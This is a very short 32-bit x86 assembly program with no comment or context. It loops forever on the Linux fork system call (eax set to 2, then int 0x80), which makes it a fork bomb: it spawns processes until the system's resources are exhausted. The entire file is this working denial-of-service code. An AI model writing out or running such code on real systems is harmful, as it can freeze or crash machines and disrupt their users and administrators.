global _start

section .text
    _start:
    mov eax, 2
    int 0x80
    jmp _start
